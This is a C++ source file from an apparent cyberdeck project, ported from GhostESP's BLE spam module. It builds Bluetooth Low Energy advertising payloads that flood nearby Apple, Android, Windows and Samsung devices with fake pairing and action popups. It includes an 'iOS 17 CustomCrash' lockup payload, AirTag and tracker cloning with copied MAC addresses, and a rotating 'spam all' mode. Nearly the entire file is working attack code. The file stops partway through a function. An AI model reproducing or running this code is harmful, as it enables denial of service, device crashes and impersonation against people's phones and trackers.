#include "cbdos/ble_payloads.hpp"
#include "../security/BleShieldService.hpp"

#include <cstring>

namespace cbdos {
namespace ble {

// ---------------------------------------------------------------------------
// Catálogos (Portados de GhostESP main/attacks/ble/ble_spam.c)
// ---------------------------------------------------------------------------

// Continuity ProximityPair: cada device_id dispara el popup "nuevo dispositivo"
// de iOS para el modelo correspondiente.
static const std::vector<AppleProximityDevice> kAppleProximityDevices = {
    {"AirPods Pro",               0x0E20},
    {"AirPods Max",               0x0A20},
    {"AirTag",                    0x0055},
    {"Hermes AirTag",             0x0030},
    {"AirPods",                   0x0220},
    {"AirPods 2nd Gen",           0x0F20},
    {"AirPods 3rd Gen",           0x1320},
    {"AirPods Pro 2nd Gen",       0x1420},
    {"Beats Flex",                0x1020},
    {"Beats Solo 3",              0x0620},
    {"Powerbeats 3",              0x0320},
    {"Powerbeats Pro",            0x0B20},
    {"Beats Solo Pro",            0x0C20},
    {"Beats Studio Buds",         0x1120},
    {"Beats X",                   0x0520},
    {"Beats Studio 3",            0x0920},
    {"Beats Studio Pro",          0x1720},
    {"Beats Fit Pro",             0x1220},
    {"Beats Studio Buds+",        0x1620},
    {"AirPods Pro 2nd Gen USB-C", 0x2420},
    {"AirPods 4 ANC",             0x2820},
    {"AirPods 4",                 0x2920},
    {"AirPods Max USB-C",         0x2B20},
    {"Beats Powerbeats Pro 2",    0x2C20},
    {"Beats Solo 4",              0x2520},
    {"Beats Solo Buds",           0x2620},
    {"Powerbeats Fit",            0x2F20},
};

static const std::vector<SwiftPairPreset> kSwiftPairPresets = {
    {"AirPods Pro"},
    {"Beats Studio 3"},
    {"AirPods Max"},
    {"T-Deck"},
    {"GhostESP"},
    {"CBDos Cyberdeck"},
    {"Surface Laptop"},
    {"Xbox Wireless"},
    {"Pixel Buds Pro"},
    {"Free VBucks"},
    {"Galaxy Buds3"},
    {"Studio Display"},
    {"Magic Trackpad"},
};

// Galaxy Buds: 24 bits de modelo (GhostESP samsung_buds_models).
static const uint32_t kSamsungBudsModels[] = {
    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41,
    0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17, 0xD30704, 0x9DB006,
    0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519,
    0xAE073A, 0x011716,
};

// Galaxy Watch: modelo de 1 byte (GhostESP samsung_watch_models: Watch4, Watch5, Watch6).
static const uint8_t kSamsungWatchModels[] = {
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
    0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E, 0x20, 0xEC, 0xEF,
};

// Google Fast Pair: 24 bits de modelo (GhostESP fastpair_models).
static const uint32_t kAndroidFastPairModels[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000,
    0x00000D, 0x000007, 0x070000, 0x000009, 0x090000, 0x000048, 0x001000,
    0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400, 0x1E89A7,
    0x0577B1, 0x05A9BC, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494,
    0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x2D7A23,
    0x038B91, 0x02F637, 0x02D886, 0xF00001, 0xF00201, 0xF00209, 0xF00305,
    0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963, 0x05AA91, 0x05C452,
    0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 0x1E955B, 0x1EC95C, 0x06AE20,
    0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
    0x0102F0, 0x054B2D, 0x0660D7, 0x0103F0, 0x0903F0, 0x9ADB11, 0x8B66AB,
    0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0x1448C9, 0x13B39D,
    0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0x92ADC9,
};

// Continuity NearbyAction: códigos de acción que abren modales en iOS (GhostESP continuity_na_actions).
static const uint8_t kContinuityActions[] = {
    0x13, // AppleTV AutoFill
    0x24, // Apple Vision Pro
    0x05, // Apple Watch
    0x27, // AppleTV Connecting...
    0x20, // Join This AppleTV?
    0x19, // AppleTV Audio Sync
    0x1E, // AppleTV Color Balance
    0x09, // Setup New iPhone
    0x2F, // Sign in to other device
    0x02, // Transfer Phone Number
    0x0B, // HomePod Setup
    0x01, // Setup New AppleTV
    0x06, // Pair AppleTV
    0x0D, // HomeKit AppleTV Setup
    0x2B, // AppleID for AppleTV?
};

// Presets de periféricos HID estándar (Human Interface Device).
static const std::vector<HidPreset> kHidPresets = {
    {"MX Master 3S", 0x03C2},       // Ratón
    {"Magic Keyboard", 0x03C1},     // Teclado
    {"DualSense Wireless", 0x03C4}, // Gamepad
    {"Keychron K2 Pro", 0x03C1},    // Teclado
    {"Razer Basilisk", 0x03C2},     // Ratón
    {"Xbox Elite Pad", 0x03C4},     // Gamepad
    {"MX Keys S", 0x03C1},          // Teclado
    {"Apex Pro Wireless", 0x03C1},  // Teclado
    {"DeathAdder V3", 0x03C2}       // Ratón
};

template <typename T, size_t N>
static constexpr size_t countOf(const T (&)[N]) { return N; }

// ---------------------------------------------------------------------------
// Utilidades internas
// ---------------------------------------------------------------------------

static uint64_t s_rngState = 0x9E3779B97F4A7C15ULL;

void BlePayloadRegistry::seed(uint64_t entropy) {
    if (entropy != 0) {
        s_rngState ^= entropy;
        if (s_rngState == 0) s_rngState = 0x9E3779B97F4A7C15ULL;
    }
}

static uint64_t rngNext() {
    s_rngState ^= s_rngState >> 12;
    s_rngState ^= s_rngState << 25;
    s_rngState ^= s_rngState >> 27;
    return s_rngState * 0x2545F4914F6CDD1DULL;
}

static uint32_t rngRange(uint32_t bound) {
    if (bound == 0) return 0;
    return static_cast<uint32_t>(rngNext() % bound);
}

static void rngFill(uint8_t* dst, size_t len) {
    for (size_t i = 0; i < len; ++i) {
        dst[i] = static_cast<uint8_t>(rngNext() >> 24);
    }
}

// Añade una AD structure al payload respetando el límite de 31 bytes.
static bool appendAd(BleAdvPayload& out, const uint8_t* data, size_t len) {
    if (out.len + len > BLE_ADV_PAYLOAD_MAX) return false;
    memcpy(out.data + out.len, data, len);
    out.len += len;
    out.valid = true;
    return true;
}

// AD type Flags (0x01). GhostESP usa 0x1A para todos los paquetes no-Apple.
static bool appendFlags(BleAdvPayload& out, uint8_t flags = 0x1A) {
    const uint8_t ad[3] = {0x02, 0x01, flags};
    return appendAd(out, ad, sizeof(ad));
}

// Añade Complete Local Name (0x09) al Scan Response y, si cabe, al propio ADV.
static void attachCustomName(BleAdvPayload& p, const char* customName) {
    if (customName == nullptr || customName[0] == '\0') return;
    size_t nameLen = strlen(customName);
    if (nameLen > 29) nameLen = 29;

    // 1. Escribir en Scan Response (máx 31 bytes)
    p.scanRsp[0] = static_cast<uint8_t>(nameLen + 1);
    p.scanRsp[1] = 0x09; // Complete Local Name
    memcpy(&p.scanRsp[2], customName, nameLen);
    p.scanRspLen = nameLen + 2;
    p.scannable = true;

    // 2. Si cabe en el propio paquete ADV, añadirlo también (como write_local_name en GhostESP)
    if (p.len + nameLen + 2 <= BLE_ADV_PAYLOAD_MAX) {
        p.data[p.len] = static_cast<uint8_t>(nameLen + 1);
        p.data[p.len + 1] = 0x09;
        memcpy(&p.data[p.len + 2], customName, nameLen);
        p.len += nameLen + 2;
    }
}

// ---------------------------------------------------------------------------
// Generadores por categoría (Portados fielmente de GhostESP ble_spam.c)
// ---------------------------------------------------------------------------

// Continuity ProximityPair (CID Apple 0x004C, tipo 0x07).
// En GhostESP:
//   - Sin Flags AD (el paquete llena los 31 bytes exactos: 6 header + 25 data).
//   - Si model == 0x0055 (AirTag) o 0x0030 (Hermes AirTag), prefix = 0x05.
//   - Si se proporciona customName, acorta la cola de 16 bytes cifrados para
//     meter el Complete Local Name (0x09) dentro del propio anuncio (hasta 14 chars).
static BleAdvPayload buildAppleProximityPair(uint8_t requestedPrefix, uint16_t model,
                                             const char* customName = nullptr) {
    BleAdvPayload p;
    p.isApple = true;
    p.scannable = true;

    uint8_t prefix = requestedPrefix;
    if (model == 0x0055 || model == 0x0030) {
        prefix = 0x05;
    }

    uint8_t color = static_cast<uint8_t>(rngRange(16));
    uint8_t budsBattery = static_cast<uint8_t>((rngRange(10) << 4) | rngRange(10));
    uint8_t caseBattery = static_cast<uint8_t>((rngRange(8) << 4) | rngRange(10));
    uint8_t lidCounter  = static_cast<uint8_t>(rngRange(256));

    // Si hay nombre personalizado, aplicar build_continuity_proximity_pair_named de GhostESP
    if (customName != nullptr && customName[0] != '\0') {
        size_t fullLen = strlen(customName);
        size_t inFrameLen = (fullLen > 14) ? 14 : fullLen;
        size_t tail = 14 - inFrameLen;
        if (tail > 16) tail = 16;

        uint8_t buf[BLE_ADV_PAYLOAD_MAX];
        size_t i = 0;
        uint8_t contLen = static_cast<uint8_t>(9 + tail);
        uint8_t total   = static_cast<uint8_t>(6 + contLen);

        buf[i++] = static_cast<uint8_t>(total - 1);
        buf[i++] = 0xFF;
        buf[i++] = 0x4C;
        buf[i++] = 0x00;
        buf[i++] = 0x07; // ContinuityTypeProximityPair
        buf[i++] = contLen;

        buf[i++] = prefix;
        buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
        buf[i++] = static_cast<uint8_t>(model & 0xFF);
        buf[i++] = 0x55;
        buf[i++] = budsBattery;
        buf[i++] = caseBattery;
        buf[i++] = lidCounter;
        buf[i++] = color;
        buf[i++] = 0x00;

        if (tail > 0) {
            rngFill(&buf[i], tail);
            i += tail;
        }

        buf[i++] = static_cast<uint8_t>(inFrameLen + 1);
        buf[i++] = 0x09; // Complete Local Name
        memcpy(&buf[i], customName, inFrameLen);
        i += inFrameLen;

        appendAd(p, buf, i);

        // Además cargar nombre completo en el Scan Response
        size_t rspNameLen = (fullLen > 29) ? 29 : fullLen;
        p.scanRsp[0] = static_cast<uint8_t>(rspNameLen + 1);
        p.scanRsp[1] = 0x09;
        memcpy(&p.scanRsp[2], customName, rspNameLen);
        p.scanRspLen = rspNameLen + 2;
        return p;
    }

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 30;   // total_size (31) - 1
    buf[i++] = 0xFF; // Manufacturer Specific
    buf[i++] = 0x4C; // Apple Inc.
    buf[i++] = 0x00;
    buf[i++] = 0x07; // ProximityPair
    buf[i++] = 25;   // continuity data length

    buf[i++] = prefix;
    buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    buf[i++] = static_cast<uint8_t>(model & 0xFF);
    buf[i++] = 0x55; // status
    buf[i++] = budsBattery;
    buf[i++] = caseBattery;
    buf[i++] = lidCounter;
    buf[i++] = color;
    buf[i++] = 0x00;
    rngFill(&buf[i], 16);
    i += 16;

    appendAd(p, buf, i);
    return p;
}

// Continuity NearbyAction (tipo 0x0F, tamaño 0x05): modales de acción de iOS.
// En GhostESP: 11 bytes exactos, SIN prefijo Flags AD.
static BleAdvPayload buildAppleNearbyAction(const char* customName = nullptr) {
    BleAdvPayload p;
    p.isApple = true;
    p.scannable = true;

    uint8_t action = kContinuityActions[rngRange(countOf(kContinuityActions))];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (rngRange(2) == 1)) flags--;
    if (action == 0x09 && (rngRange(2) == 1)) flags = 0x40;

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 10;   // total_size (11) - 1
    buf[i++] = 0xFF;
    buf[i++] = 0x4C;
    buf[i++] = 0x00;
    buf[i++] = 0x0F; // ContinuityTypeNearbyAction
    buf[i++] = 5;    // continuity data length
    buf[i++] = flags;
    buf[i++] = action;
    rngFill(&buf[i], 3);
    i += 3;

    appendAd(p, buf, i);
    attachCustomName(p, customName);
    return p;
}

// Continuity CustomCrash (iOS 17 lockup — @ECTO-1A, portado de GhostESP build_continuity_custom_crash).
// 17 bytes: NearbyAction (0x0F) + 0x00 0x00 + NearbyInfo (0x10) + 3 bytes aleatorios. Sin Flags AD.
static BleAdvPayload buildAppleCustomCrash(const char* customName = nullptr) {
    BleAdvPayload p;
    p.isApple = true;
    p.scannable = true;

    uint8_t action = kContinuityActions[rngRange(countOf(kContinuityActions))];
    uint8_t flags = 0xC0;
    if (action == 0x20 && (rngRange(2) == 1)) flags--;
    if (action == 0x09 && (rngRange(2) == 1)) flags = 0x40;

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    buf[i++] = 16;   // AD length (17 - 1)
    buf[i++] = 0xFF; // Manufacturer Specific
    buf[i++] = 0x4C; // Apple
    buf[i++] = 0x00;
    buf[i++] = 0x0F; // ContinuityTypeNearbyAction
    buf[i++] = 5;    // continuity data length
    buf[i++] = flags;
    buf[i++] = action;
    rngFill(&buf[i], 3);
    i += 3;
    buf[i++] = 0x00; // terminator
    buf[i++] = 0x00;
    buf[i++] = 0x10; // NearbyInfo continuity type
    rngFill(&buf[i], 3);
    i += 3;

    appendAd(p, buf, i);
    attachCustomName(p, customName);
    return p;
}

// Google Fast Pair: Flags (0x1A) + 16-bit Service UUID 0xFE2C + Service Data 0xFE2C + TxPower.
// Portado de build_fastpair_adv de GhostESP.
static BleAdvPayload buildAndroidFastPair(uint32_t model, const char* customName = nullptr) {
    BleAdvPayload p;
    appendFlags(p, 0x1A);

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    size_t i = 0;
    // AD record 1: 16-bit UUID list containing 0xFE2C
    buf[i++] = 3;
    buf[i++] = 0x03;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;

    // AD record 2: Service Data for UUID 0xFE2C + 3-byte model
    buf[i++] = 6;
    buf[i++] = 0x16;
    buf[i++] = 0x2C;
    buf[i++] = 0xFE;
    buf[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    buf[i++] = static_cast<uint8_t>(model & 0xFF);

    // AD record 3: Tx Power Level (-100 to +19 dBm, exacto a GhostESP)
    buf[i++] = 2;
    buf[i++] = 0x0A;
    buf[i++] = static_cast<uint8_t>(static_cast<int8_t>(rngRange(120)) - 100);

    appendAd(p, buf, i);
    attachCustomName(p, customName);
    return p;
}

// Microsoft Swift Pair (Portado de build_swiftpair_adv de GhostESP):
// Prefijo Flags (0x02, 0x01, 0x1A) + [size-1][0xFF][0x06][0x00][0x03][0x00][0x80][name...]
// Además carga el nombre en el Scan Response (0x09) para que Linux/BlueZ, Windows y Android
// muestren siempre el nombre del dispositivo tanto por beacon SwiftPair como por GAP Name.
static BleAdvPayload buildSwiftPairAdv(const char* customName) {
    const char* name = customName;
    if (name == nullptr || name[0] == '\0') {
        name = kSwiftPairPresets[rngRange(kSwiftPairPresets.size())].name;
    }
    size_t nameLen = strlen(name);
    if (nameLen > 21) nameLen = 21; // 3 bytes flags + (7 + nameLen) <= 31

    BleAdvPayload p;
    appendFlags(p, 0x1A);

    uint8_t buf[BLE_ADV_PAYLOAD_MAX];
    uint8_t size = static_cast<uint8_t>(7 + nameLen);
    size_t i = 0;

    buf[i++] = static_cast<uint8_t>(size - 1); // AD length
    buf[i++] = 0xFF;                           // Manufacturer Specific
    buf[i++] = 0x06;                           // Microsoft CID low
    buf[i++] = 0x00;                           // Microsoft CID high
    buf[i++] = 0x03;                           // Microsoft Beacon ID
    buf[i++] = 0x00;                           // Microsoft Beacon Sub Scenario
    buf[i++] = 0x80;                           // Reserved RSSI byte
    memcpy(&buf[i], name, nameLen);
    i += nameLen;

    appendAd(p, buf, i);

    // También inyectar Complete Local Name en el Scan Response para BlueZ / Linux
    p.scanRsp[0] = static_cast<uint8_t>(nameLen + 1);
    p.scanRsp[1] = 0x09;
    memcpy(&p.scanRsp[2], name, nameLen);
    p.scanRspLen = nameLen + 2;
    p.scannable = true;

    return p;
}

// Samsung Galaxy Buds (Portado de build_samsung_buds_adv de GhostESP):
// 3 bytes Flags (0x02, 0x01, 0x1A) + 28 bytes de Samsung Mfg Data = 31 bytes exactos.
static BleAdvPayload buildSamsungBuds(const char* customName = nullptr) {
    BleAdvPayload p;
    appendFlags(p, 0x1A);

    uint32_t model = kSamsungBudsModels[rngRange(countOf(kSamsungBudsModels))];
    uint8_t buf[28];
    size_t i = 0;
    buf[i++] = 27;   // length
    buf[i++] = 0xFF; // Manufacturer Specific
    buf[i++] = 0x75; // Samsung Electronics Co. Ltd.
    buf[i++] = 0x00;
    buf[i++] = 0x42;
    buf[i++] = 0x09;
    buf[i++] = 0x81;
    buf[i++] = 0x02;
    buf[i++] = 0x14;
    buf[i++] = 0x15;
    buf[i++] = 0x03;
    buf[i++] = 0x21;
    buf[i++] = 0x01;
    buf[i++] = 0x09;
    buf[i++] = static_cast<uint8_t>((model >> 16) & 0xFF);
    buf[i++] = static_cast<uint8_t>((model >> 8) & 0xFF);
    buf[i++] = 0x01;
    buf[i++] = static_cast<uint8_t>(model & 0xFF);
    buf[i++] = 0x06;
    buf[i++] = 0x3C;
    buf[i++] = 0x94;
    buf[i++] = 0x8E;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    buf[i++] = 0xC7;
    buf[i++] = 0x00;

    appendAd(p, buf, i);
    attachCustomName(p, customName);
    return p;
}

// Samsung Galaxy Watch (Portado de build_samsung_watch_adv de GhostESP):
// 3 bytes Flags (0x02, 0x01, 0x1A) + 15 bytes de Samsung Watch Data = 18 bytes.
static BleAdvPayload buildSamsungWatch(const char* customName = nullptr) {
    BleAdvPayload p;
    appendFlags(p, 0x1A);

    uint8_t model = kSamsungWatchModels[rngRange(countOf(kSamsungWatchModels))];
    const uint8_t buf[15] = {
        14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,
        0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
    };
    appendAd(p, buf, sizeof(buf));
    attachCustomName(p, customName);
    return p;
}

// Periféricos HID estándar (Human Interface Device):
static BleAdvPayload buildHidPeripheralAdv(const char* customName, uint16_t appearance) {
    const char* name = customName;
    uint16_t app = appearance;
    if (name == nullptr || name[0] == '\0') {
        const auto& preset = kHidPresets[rngRange(kHidPresets.size())];
        name = preset.name;
        app = preset.appearance;
    } else if (app == 0) {
        app = 0x03C1; // Teclado por defecto si solo se dio nombre
    }
    size_t nameLen = strlen(name);
    if (nameLen > 18) nameLen = 18;

    BleAdvPayload p;
    p.scannable = true;
    appendFlags(p, 0x06);

    const uint8_t srvAd[4] = {0x03, 0x03, 0x12, 0x18};
    appendAd(p, srvAd, sizeof(srvAd));

    const uint8_t appAd[4] = {
        0x03, 0x19,
        static_cast<uint8_t>(app & 0xFF),
        static_cast<uint8_t>(app >> 8)
    };
    appendAd(p, appAd, sizeof(appAd));

    uint8_t nameAd[20];
    nameAd[0] = static_cast<uint8_t>(nameLen + 1);
    nameAd[1] = 0x09;
    memcpy(&nameAd[2], name, nameLen);
    appendAd(p, nameAd, nameLen + 2);

    p.scanRsp[0] = static_cast<uint8_t>(nameLen + 1);
    p.scanRsp[1] = 0x09;
    memcpy(&p.scanRsp[2], name, nameLen);
    p.scanRspLen = nameLen + 2;

    return p;
}

// Clonación / Spoof de AirTag o Tracker capturado (Portado de airtag_scan_start_spoofing en GhostESP)
BleAdvPayload BlePayloadRegistry::buildAirTagSpoof(const uint8_t* rawPayload, size_t rawLen,
                                                   const uint8_t mac[6]) {
    BleAdvPayload p;
    p.scannable = true;

    if (rawPayload == nullptr || rawLen == 0) {
        // Si aún no hay un AirTag capturado en Air Recon, construir una baliza AirTag legítima (0x0055)
        return buildAppleProximityPair(0x05, 0x0055, nullptr);
    }

    // Buscar el bloque Manufacturer Specific Data (0xFF) dentro del payload capturado
    const uint8_t* mfgStart = nullptr;
    size_t mfgLen = 0;
    size_t idx = 0;
    while (idx < rawLen) {
        uint8_t fieldLen = rawPayload[idx];
        if (fieldLen == 0 || idx + fieldLen >= rawLen) break;
        uint8_t fieldType = rawPayload[idx + 1];
        if (fieldType == 0xFF && fieldLen >= 3) {
            mfgStart = &rawPayload[idx + 2];
            mfgLen = fieldLen - 1;
            break;
        }
        idx += fieldLen + 1;
    }

    appendFlags(p, 0x1A);

    if (mfgStart != nullptr && mfgLen > 0) {
        size_t space = BLE_ADV_PAYLOAD_MAX - p.len;
        if (space >= 5) {
            size_t maxMfg = space - 2;
            size_t copyLen = (mfgLen > maxMfg) ? maxMfg : mfgLen;
            uint8_t ad[BLE_ADV_PAYLOAD_MAX];
            ad[0] = static_cast<uint8_t>(copyLen + 1);
            ad[1] = 0xFF;
            memcpy(&ad[2], mfgStart, copyLen);
            appendAd(p, ad, copyLen + 2);
        }
    } else if (rawLen > 2) {
        size_t space = BLE_ADV_PAYLOAD_MAX - p.len;
        if (space >= 5) {
            size_t maxMfg = space - 2;
            size_t copyLen = rawLen - 2;
            if (copyLen > maxMfg) copyLen = maxMfg;
            uint8_t ad[BLE_ADV_PAYLOAD_MAX];
            ad[0] = static_cast<uint8_t>(copyLen + 1);
            ad[1] = 0xFF;
            memcpy(&ad[2], &rawPayload[2], copyLen);
            appendAd(p, ad, copyLen + 2);
        }
    }

    if (mac != nullptr) {
        memcpy(p.customMac, mac, 6);
        p.customMac[5] |= 0xC0; // Static random address (bits altos a 11 como en GhostESP)
        if ((p.customMac[0] | p.customMac[1] | p.customMac[2] | p.customMac[3] | p.customMac[4] | (p.customMac[5] & 0x3F)) == 0) {
            p.customMac[0] = 0x01;
        }
        p.hasCustomMac = true;
    }

    return p;
}

// Baliza genérica: Flags + lista de UUID de 16 bits + Appearance + nombre.
BleAdvPayload BlePayloadRegistry::buildGenericBeacon(const char* deviceName,
                                                    uint16_t uuid16,
                                                    uint16_t major,
                                                    uint16_t minor,
                                                    int8_t txPower) {
    BleAdvPayload p;
    p.scannable = true;
    appendFlags(p, 0x06);

    uint8_t uuidAd[4] = {
        0x03, 0x03,
        static_cast<uint8_t>(uuid16 & 0xFF), static_cast<uint8_t>(uuid16 >> 8)
    };
    appendAd(p, uuidAd, sizeof(uuidAd));

    uint8_t appAd[5] = {
        0x03, 0x19,
        static_cast<uint8_t>(txPower & 0xFF),
        static_cast<uint8_t>(major & 0xFF), static_cast<uint8_t>(minor & 0xFF)
    };
    appendAd(p, appAd, sizeof(appAd));

    if (deviceName != nullptr && deviceName[0] != '\0') {
        size_t n = strlen(deviceName);
        if (n > 18) n = 18;
        uint8_t nameAd[BLE_ADV_PAYLOAD_MAX];
        nameAd[0] = static_cast<uint8_t>(n + 1);
        nameAd[1] = 0x09;
        memcpy(&nameAd[2], deviceName, n);
        appendAd(p, nameAd, n + 2);
    }
    return p;
}

// Helper: obtiene los dispositivos clonables (priorizando Trackers/AirTags) desde BleShieldService
static std::vector<radio::BleDeviceRecord> getSpoofableDevices() {
    auto all = security::BleShieldService::getInstance().getDevices();
    std::vector<radio::BleDeviceRecord> trackers;
    std::vector<radio::BleDeviceRecord> others;
    for (const auto& d : all) {
        if (d.rawPayloadLen == 0) continue;
        if (d.isTracker || d.category == radio::BleDeviceCategory::AppleAirTag ||
            d.category == radio::BleDeviceCategory::SamsungSmartTag) {
            trackers.push_back(d);
        } else {
            others.push_back(d);
        }
    }
    trackers.insert(trackers.end(), others.begin(), others.end());
    return trackers;
}

// ---------------------------------------------------------------------------
// Fachada pública
// ---------------------------------------------------------------------------

BleAdvPayload BlePayloadRegistry::build(BlePayloadCategory category, int variantIndex,
                                        const char* customName) {
    switch (category) {
        case BlePayloadCategory::ApplePairing: {
            const auto& devices = kAppleProximityDevices;
            uint16_t id;
            if (variantIndex <= 0 || variantIndex > static_cast<int>(devices.size())) {
                id = devices[rngRange(devices.size())].deviceId;
            } else {
                id = devices[variantIndex - 1].deviceId;
            }
            return buildAppleProximityPair(0x07, id, customName);
        }
        case BlePayloadCategory::AppleNotYourDevice: {
            const auto& devices = kAppleProximityDevices;
            uint16_t id;
            if (variantIndex <= 0 || variantIndex > static_cast<int>(devices.size())) {
                id = devices[rngRange(devices.size())].deviceId;
            } else {
                id = devices[variantIndex - 1].deviceId;
            }
            return buildAppleProximityPair(0x01, id, customName);
        }
        case BlePayloadCategory::AppleAction:
            return buildAppleNearbyAction(customName);
        case BlePayloadCategory::AppleCrash:
            return buildAppleCustomCrash(customName);
        case BlePayloadCategory::AndroidFastPair: {
            uint32_t model;
            if (variantIndex > 0 && variantIndex <= static_cast<int>(countOf(kAndroidFastPairModels))) {
                model = kAndroidFastPairModels[variantIndex - 1];
            } else {
                model = kAndroidFastPairModels[rngRange(countOf(kAndroidFastPairModels))];
            }
            return buildAndroidFastPair(model, customName);
        }
        case BlePayloadCategory::WindowsSwiftPair: {
            if (customName != nullptr && customName[0] != '\0') {
                return buildSwiftPairAdv(customName);
            }
            size_t n = kSwiftPairPresets.size();
            if (variantIndex <= 0 || variantIndex > static_cast<int>(n)) {
                return buildSwiftPairAdv(nullptr);
            }
            return buildSwiftPairAdv(kSwiftPairPresets[variantIndex - 1].name);
        }
        case BlePayloadCategory::SamsungBuds:
            return buildSamsungBuds(customName);
        case BlePayloadCategory::SamsungWatch:
            return buildSamsungWatch(customName);
        case BlePayloadCategory::GenericBeacon:
            return buildGenericBeacon(
                (customName && customName[0] != '\0') ? customName : "CBDos",
                0x1812, 1, 1, 0xC0);
        case BlePayloadCategory::HidPeripherals: {
            if (customName != nullptr && customName[0] != '\0') {
                return buildHidPeripheralAdv(customName, 0x03C1);
            }
            size_t n = kHidPresets.size();
            if (variantIndex <= 0 || variantIndex > static_cast<int>(n)) {
                return buildHidPeripheralAdv(nullptr, 0);
            }
            const auto& preset = kHidPresets[variantIndex - 1];
            return buildHidPeripheralAdv(preset.name, preset.appearance);
        }
        case BlePayloadCategory::SpoofAirTag: {
            auto devs = getSpoofableDevices();
            if (devs.empty()) {
                return buildAppleProximityPair(0x05, 0x0055, customName);
            }
            size_t idx = (variantIndex <= 0 || variantIndex > static_cast<int>(devs.size()))
                             ? rngRange(devs.size())
                             : static_cast<size_t>(variantIndex - 1);
            const auto& d = devs[idx];
            return buildAirTagSpoof(d.rawPayload, d.rawPayloadLen, d.mac);
        }
        case BlePayloadCategory::SpamAll: {
            // Modo BLE_SPAM_RANDOM de GhostESP: alterna entre Microsoft, Apple
            // (ProximityPair / NearbyAction / CustomCrash), Samsung (Buds / Watch),
            // Google Fast Pair y HID.
            static const BlePayloadCategory s_protocols[] = {
                BlePayloadCategory::WindowsSwiftPair,
                BlePayloadCategory::ApplePairing,
                BlePayloadCategory::AppleAction,
                BlePayloadCategory::AppleCrash,
                BlePayloadCategory::SamsungBuds,
                BlePayloadCategory::SamsungWatch,
                BlePayloadCategory::AndroidFastPair,
                BlePayloadCategory::HidPeripherals
            };
            BlePayloadCategory cat = s_protocols[rngRange(countOf(s_protocols))];
            return build(cat, 0, customName);
        }
    }
    BleAdvPayload empty;
    return empty;
}

BleAdvPayload BlePayloadRegistry::buildSwiftPair(const char* customName) {
    return buildSwiftPairAdv(customName);
}

std::vector<std::string> BlePayloadRegistry::getVariantNames(BlePayloadCategory category) {
    std::vector<std::string> out;
    switch (category) {
        case BlePayloadCategory::ApplePairing:
        case BlePayloadCategory::AppleNotYourDevice:
            out.emplace_back("Random / All (Ciclo modelos)");
            for (const auto& d : kAppleProximityDevices) out.emplace_back(d.name);
            break;
        case BlePayloadCategory::AndroidFastPair:
            out.emplace_back("Random / All (70 modelos)");
            break;
        case BlePayloadCategory::WindowsSwiftPair:
            out.emplace_back("Random / All (Ciclo automático)");
            for (const auto& p : kSwiftPairPresets) out.emplace_back(p.name);
            break;
        case BlePayloadCategory::AppleAction:
            out.emplace_back("Nearby Action (15 modales iOS)");
            break;
        case BlePayloadCategory::AppleCrash:
            out.emplace_back("iOS 17 CustomCrash (@ECTO-1A)");
            break;
        case BlePayloadCategory::SamsungBuds:
            out.emplace_back("Galaxy Buds (20 modelos)");
            break;
        case BlePayloadCategory::SamsungWatch:
            out.emplace_back("Galaxy Watch 4/5/6 (30 modelos)");
            break;
        case BlePayloadCategory::GenericBeacon:
            out.emplace_back("Baliza HID genérica");
            break;
        case BlePayloadCategory::HidPeripherals:
            out.emplace_back("Random / All (Ciclo automático)");
            for (const auto& h : kHidPresets) out.emplace_back(h.name);
            break;
        case BlePayloadCategory::SpoofAirTag: {
            auto devs = getSpoofableDevices();
            if (devs.empty()) {
                out.emplace_back("AirTag Base (Escanea en Recon para clonar)");
            } else {
                out.emplace_back("Rotar entre detectados (" + std::to_string(devs.size()) + ")");
                for (const auto& d : devs) {
                    std::string label = d.name + " [" + d.macStr.substr(9) + "] " + std::to_string(d.rssi) + "dBm";
                    out.push_back(label);
                }
            }
            break;
        }
        case BlePayloadCategory::SpamAll:
            out.emplace_back("Todos los protocolos (GhostESP Random)");
            break;
    }
    return out;
}

size_t BlePayloadRegistry::getVariantCount(BlePayloadCategory category) {
    return getVariantNames(category).size();
}

const char* BlePayloadRegistry::getCategoryName(BlePayloadCategory category) {
    switch (category) {
        case BlePayloadCategory::ApplePairing:      return "Apple ProximityPair";
        case BlePayloadCategory::AppleAction:       return "Apple NearbyAction";
        case BlePayloadCategory::AppleNotYourDevice:return "Apple Not Your Device";
        case BlePayloadCategory::AppleCrash:        return "Apple iOS Crash";
        case BlePayloadCategory::AndroidFastPair:   return "Google Fast Pair";
        case BlePayloadCategory::WindowsSwiftPair:  return "MS Swift Pair";
